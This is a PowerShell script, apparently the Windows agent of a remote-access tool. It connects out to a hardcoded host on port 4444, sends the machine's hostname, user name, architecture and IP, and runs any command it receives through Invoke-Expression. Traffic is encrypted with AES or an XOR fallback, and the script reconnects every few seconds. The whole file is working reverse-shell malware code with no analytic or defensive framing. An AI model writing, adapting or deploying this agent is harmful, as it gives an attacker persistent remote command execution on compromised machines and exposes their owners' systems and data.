$ServerHost = "10.64.142.90"
$ServerPort = 4444

function Get-LocalIP {
    try {
        $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {
            $_.InterfaceAlias -notlike '*Loopback*' -and 
            $_.InterfaceAlias -notlike '*VMware*' -and
            $_.InterfaceAlias -notlike '*VirtualBox*'
        } | Select-Object -First 1).IPAddress
        
        if (-not $ip) {
            $socket = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Dgram, [System.Net.Sockets.ProtocolType]::Udp)
            try {
                $socket.Connect("8.8.8.8", 80)
                $ip = $socket.LocalEndPoint.Address.ToString()
            } finally {
                $socket.Close()
            }
        }
        
        return $ip
    } catch {
        return "N/A"
    }
}

function Invoke-XOREncryption {
    param(
        [byte[]]$Data,
        [byte[]]$Key
    )
    
    $output = New-Object byte[] $Data.Length
    for ($i = 0; $i -lt $Data.Length; $i++) {
        $output[$i] = $Data[$i] -bxor $Key[$i % $Key.Length]
    }
    
    return $output
}

function Invoke-FernetDecrypt {
    param(
        [byte[]]$EncryptedData,
        [byte[]]$Key
    )
    
    try {
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aes.KeySize = 256
        
        $keyBytes = $Key[0..31]
        $aes.Key = $keyBytes
        
        $iv = $EncryptedData[0..15]
        $aes.IV = $iv
        
        $decryptor = $aes.CreateDecryptor()
        $encryptedContent = $EncryptedData[16..($EncryptedData.Length - 1)]
        
        $decrypted = $decryptor.TransformFinalBlock($encryptedContent, 0, $encryptedContent.Length)
        
        $aes.Dispose()
        
        return [System.Text.Encoding]::UTF8.GetString($decrypted)
    } catch {
        $decrypted = Invoke-XOREncryption -Data $EncryptedData -Key $Key
        return [System.Text.Encoding]::UTF8.GetString($decrypted)
    }
}

function Invoke-FernetEncrypt {
    param(
        [string]$Data,
        [byte[]]$Key
    )
    
    try {
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aes.KeySize = 256
        
        $keyBytes = $Key[0..31]
        $aes.Key = $keyBytes
        
        $aes.GenerateIV()
        $iv = $aes.IV
        
        $encryptor = $aes.CreateEncryptor()
        $dataBytes = [System.Text.Encoding]::UTF8.GetBytes($Data)
        $encrypted = $encryptor.TransformFinalBlock($dataBytes, 0, $dataBytes.Length)
        
        $result = New-Object byte[] ($iv.Length + $encrypted.Length)
        [Array]::Copy($iv, 0, $result, 0, $iv.Length)
        [Array]::Copy($encrypted, 0, $result, $iv.Length, $encrypted.Length)
        
        $aes.Dispose()
        
        return $result
    } catch {
        $dataBytes = [System.Text.Encoding]::UTF8.GetBytes($Data)
        return Invoke-XOREncryption -Data $dataBytes -Key $Key
    }
}

function Invoke-Command {
    param(
        [string]$Command,
        [hashtable]$SystemInfo
    )
    
    if ($Command -eq "SYSINFO") {
        $output = "OS: $($SystemInfo.OS)`n"
        $output += "Hostname: $($SystemInfo.Hostname)`n"
        $output += "User: $($SystemInfo.User)`n"
        $output += "Arch: $($SystemInfo.Arch)`n"
        $output += "Agent IP: $($SystemInfo.AgentIP)`n"
        $output += "PowerShell Version: $($PSVersionTable.PSVersion.ToString())`n"
        $output += "Current Dir: $(Get-Location)"
        return $output
    } elseif ($Command -eq "SCREENSHOT") {
        return "ERROR: Screenshot not supported in PowerShell agent (use Python agent)"
    } elseif ($Command -in @("exit", "quit", "disconnect")) {
        return "Agent disconnecting..."
    }
    
    try {
        $result = Invoke-Expression $Command 2>&1 | Out-String
        if ([string]::IsNullOrWhiteSpace($result)) {
            return "Command executed (no output)"
        }
        return $result
    } catch {
        return "ERROR: $($_.Exception.Message)"
    }
}

while ($true) {
    try {
        Write-Host "[*] Connecting to $ServerHost:$ServerPort"
        
        $client = New-Object System.Net.Sockets.TcpClient
        $client.Connect($ServerHost, $ServerPort)
        
        Write-Host "[+] Connected!"
        
        $stream = $client.GetStream()
        $stream.ReadTimeout = 10000
        
        $keyBuffer = New-Object byte[] 1024
        $bytesRead = $stream.Read($keyBuffer, 0, $keyBuffer.Length)
        
        if ($bytesRead -eq 0) {
            Write-Host "[-] No key received"
            $client.Close()
            Start-Sleep -Seconds 5
            continue
        }
        
        $key = $keyBuffer[0..($bytesRead - 1)]
        
        Write-Host "[+] Key received"
        
        $hostname = $env:COMPUTERNAME
        $user = $env:USERNAME
        $os = "Windows"
        $arch = $env:PROCESSOR_ARCHITECTURE
        $agentIP = Get-LocalIP
        
        $systemInfo = @{
            OS = $os
            Hostname = $hostname
            User = $user
            Arch = $arch
            AgentIP = $agentIP
        }
        
        $info = @{
            os = $os
            hostname = $hostname
            user = $user
            architecture = $arch
            agentIP = $agentIP
            pythonVersion = "PowerShell-$($PSVersionTable.PSVersion.ToString())"
        } | ConvertTo-Json -Compress
        
        $infoBytes = [System.Text.Encoding]::UTF8.GetBytes($info)
        $stream.Write($infoBytes, 0, $infoBytes.Length)
        $stream.Flush()
        
        Start-Sleep -Milliseconds 500
        
        Write-Host "[+] Handshake complete"
        
        $stream.ReadTimeout = 0
        
        while ($client.Connected) {
            $buffer = New-Object byte[] 8192
            $encryptedCmd = New-Object System.Collections.ArrayList
            
            while ($true) {
                try {
                    $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
                    
                    if ($bytesRead -eq 0) {
                        throw "Connection closed"
                    }
                    
                    [void]$encryptedCmd.AddRange($buffer[0..($bytesRead - 1)])
                    
                    try {
                        $command = Invoke-FernetDecrypt -EncryptedData ([byte[]]$encryptedCmd.ToArray()) -Key $key
                        
                        if (-not [string]::IsNullOrWhiteSpace($command)) {
                            Write-Host "[+] Command: $($command.Substring(0, [Math]::Min(50, $command.Length)))..."
                            break
                        }
                    } catch {
                        if ($encryptedCmd.Count -gt 1048576) {
                            throw "Command too large"
                        }
                        continue
                    }
                } catch {
                    throw
                }
            }
            
            $output = Invoke-Command -Command $command -SystemInfo $systemInfo
            
            if ($output.Length -gt 1000000) {
                $output = $output.Substring(0, 1000000) + "`n...[OUTPUT TRUNCATED - TOO LARGE]"
            }
            
            $encryptedOutput = Invoke-FernetEncrypt -Data $output -Key $key
            $endMarker = [System.Text.Encoding]::ASCII.GetBytes("<END>")
            
            $response = New-Object byte[] ($encryptedOutput.Length + $endMarker.Length)
            [Array]::Copy($encryptedOutput, 0, $response, 0, $encryptedOutput.Length)
            [Array]::Copy($endMarker, 0, $response, $encryptedOutput.Length, $endMarker.Length)
            
            $stream.Write($response, 0, $response.Length)
            $stream.Flush()
            
            Write-Host "[+] Response sent"
            
            if ($command -in @("exit", "quit", "disconnect")) {
                break
            }
        }
        
        $client.Close()
        Write-Host "[*] Disconnected"
        
    } catch {
        Write-Host "[-] Error: $($_.Exception.Message)"
    }
    
    Write-Host "[*] Reconnecting in 5 seconds..."
    Start-Sleep -Seconds 5
}